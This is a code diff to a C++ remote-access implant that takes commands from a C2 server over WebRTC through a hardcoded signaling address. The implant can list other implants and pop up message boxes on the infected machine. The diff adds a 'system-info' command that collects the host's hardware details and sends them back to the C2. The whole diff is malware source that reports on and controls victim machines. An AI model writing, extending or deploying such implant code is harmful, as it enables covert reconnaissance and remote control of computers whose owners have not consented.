@@ -56,39 +56,77 @@ shared_ptr<PeerConnection> createPeerConnection(const Configuration &config,
                                                 weak_ptr<WebSocket> wws, string id);
 string randomId(size_t length);
 
+SYSTEM_INFO getSystemInfo(string data) {
+	SYSTEM_INFO siSysInfo;
+
+   // Copy the hardware information to the SYSTEM_INFO structure. 
+   GetSystemInfo(&siSysInfo); 
+
+   // Display the contents of the SYSTEM_INFO structure for Testing
+   printf("Hardware information: \n");  
+   printf("  OEM ID: %u\n", siSysInfo.dwOemId);
+   printf("  Number of processors: %u\n", 
+      siSysInfo.dwNumberOfProcessors); 
+   printf("  Page size: %u\n", siSysInfo.dwPageSize); 
+   printf("  Processor type: %u\n", siSysInfo.dwProcessorType); 
+   printf("  Minimum application address: %lx\n", 
+      siSysInfo.lpMinimumApplicationAddress); 
+   printf("  Maximum application address: %lx\n", 
+      siSysInfo.lpMaximumApplicationAddress); 
+   printf("  Active processor mask: %u\n", 
+      siSysInfo.dwActiveProcessorMask);
+	   
+   return siSysInfo;
+}
 
 /***
-* Interprets messages from the C2 (Verify, Decrypt, Process)
+* Interprets messages from the C2 (Verify, Decrypt, Process) and creates an answer to send to the C2s
 ***/
 
-int parseMessage(string message) {
+string parseMessage(string message) {
 
 	//Commands
-	string cmd1 = "list-implants";
-	string cmd2 = "pop-up";
+	string cmd1 = "list-implants"; //Provides an updated version of implants and their respective information
+	string cmd2 = "pop-up"; //Pops up a windows with the provided message (Testing purposes)
+	string cmd3 = "system-info"; //Asks for system information 
 
 
 	/***
-	* list-implants - List the implants connected on the network.
+	* list-implants | List the implants connected on the network.
 	***/
 	if (strncmp(message.c_str(), cmd1.c_str(), cmd1.size()) == 0) {
 	
-		string data = message.substr(message.find(":") + 1); //Get Data from command
+		string data = message.substr(message.find(":") + 1); //Parameter (Data for command)
 		//TODO: Update arrays and save on to disk
 
 
 	/***
-	* pop-up - Pop a message box with the give message
+	* pop-up | Pop a message box with the give message
 	***/
 	}else if(strncmp(message.c_str(), cmd2.c_str(), cmd2.size()) == 0) {
 		string data = message.substr(message.find(":") + 1); 
 		int msgboxID = MessageBox(NULL,data.c_str(),"Important Message",MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2);
 
-	}else
+
+	/***
+	* system-info | Returns basic system information
+	***/
+	}else if(strncmp(message.c_str(), cmd3.c_str(), cmd3.size()) == 0) {
+		string data = message.substr(message.find(":") + 1); //Parameter
+
+		SYSTEM_INFO sysInfo = getSystemInfo(data);
+		auto oemId = std::to_string(sysInfo.dwOemId);
+		auto processorNumber = std::to_string(sysInfo.dwNumberOfProcessors);
+		auto pageSize = std::to_string(sysInfo.dwPageSize);
+		auto processorType = std::to_string(sysInfo.dwProcessorType);
+		auto activeProcessorMask = std::to_string(sysInfo.dwActiveProcessorMask);
+
+		auto answer = oemId + ":" + processorNumber + ":" + pageSize + ":" + processorType + ":" + activeProcessorMask;
+		return answer;
+	} else
 		cout << message << endl;
 
-
-	return 1;
+	return "Received Correctly";
 }
 
 int main(int argc, char **argv) try {
@@ -96,12 +134,12 @@ int main(int argc, char **argv) try {
 
 	rtc::InitLogger(LogLevel::Info);
 	Configuration config;
-	//stunServer hardcodes
-	string stunServer = "stun:stun.l.google.com:19302";		
+	// stunServer hardcodes
+	string stunServer = "stun:stun.l.google.com:19302";
 	string stunServer2 = "stun:stun2.l.google.com:19302";
 	string signalServed = "ws://73.4.243.143:8000";
 	string c2id = "6969";
-	
+
 	config.iceServers.emplace_back(stunServer);
 	// local id generation
 	localId = randomId(4);
@@ -209,8 +247,11 @@ int main(int argc, char **argv) try {
 
 				//Interpret Messages (Verify, Decrypt, Interpret) 
 				cout << "CONSUMING.." << endl;
-				parseMessage(get<string>(data));
-
+				string answer = parseMessage(get<string>(data));
+				if(auto dc = wdc.lock()){
+					cout << "SENDING ANSWER TO C2" << endl;
+					dc->send(answer);
+				}
 			}
 			else
 				cout << "Binary message from C2 received, size=" << get<binary>(data).size() << endl;
